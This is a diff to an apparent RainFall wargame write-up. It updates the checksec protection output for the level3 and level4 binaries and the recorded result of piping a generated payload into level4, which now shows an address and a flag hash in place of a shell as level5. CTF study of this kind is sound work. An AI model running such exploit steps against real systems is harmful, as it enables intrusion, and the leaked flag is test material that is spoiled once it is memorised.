@@ -131,9 +131,9 @@ The target is a vulnerable binary named `level3` from the RainFall wargame on Li
 ## 🔐 Binary Protections
 
 ```bash
-$ checksec ./level3
-RELRO           STACK CANARY      NX            PIE             FILE
-No RELRO        No canary found   NX disabled   No PIE          ./level3
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
+
 
 $ cat /proc/sys/kernel/randomize_va_space
 0
@@ -223,9 +223,9 @@ The target is a vulnerable binary named `level4` from the RainFall wargame on Li
 ## 🔐 Binary Protections
 
 ```bash
-$ checksec ./level3
-RELRO           STACK CANARY      NX            PIE             FILE
-No RELRO        No canary found   NX disabled   No PIE          ./level3
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
+
 
 void p(char *param_1)
 
@@ -305,8 +305,7 @@ print("Wrote payload with offset %d" % offset)
 ```
 python exploit.py 11 
 (cat payload.txt; cat) | ./level4
-Wait what?!
-$ whoami
-level5
+                                                b7ff26b0
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
 
